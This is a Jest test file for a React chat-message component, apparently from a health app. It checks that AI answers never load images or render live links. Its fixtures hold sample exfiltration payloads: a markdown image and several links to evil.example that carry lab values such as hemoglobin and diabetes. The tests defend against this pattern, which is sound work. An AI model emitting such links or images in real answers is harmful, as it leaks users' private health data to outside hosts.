import { render, screen } from '@testing-library/react';

import { MessageBubble } from './MessageBubble';

jest.mock('../../../app/providers/UserProvider', () => ({
  useUser: () => ({ id: 'user-1' }),
}));

describe('MessageBubble', () => {
  it('renders markdown in an answer without loading images', () => {
    const { container } = render(
      <MessageBubble
        message={{
          type: 'ai',
          id: 'm1',
          text: 'Your **hemoglobin** is 16.1 ![chart](https://evil.example/log?hb=16.1)',
          timestamp: new Date('2025-01-01T00:00:00Z'),
        }}
      />,
    );

    expect(screen.getByText('hemoglobin').tagName).toEqual('STRONG');
    expect(container.querySelector('img')).toBeNull();
  });

  it('renders every kind of link in an answer as plain text', () => {
    const { container } = render(
      <MessageBubble
        message={{
          type: 'ai',
          id: 'm2',
          text: '[View your lab report](https://evil.example/r?d=diabetes) [CDC][cdc] https://evil.example/bare [email us](mailto:a@evil.example?body=labs)\n\n[cdc]: https://www.cdc.gov/',
          timestamp: new Date('2025-01-01T00:00:00Z'),
        }}
      />,
    );

    expect(container.querySelector('a')).toBeNull();
    expect(container.textContent).toContain(
      'View your lab report CDC https://evil.example/bare email us',
    );
  });
});
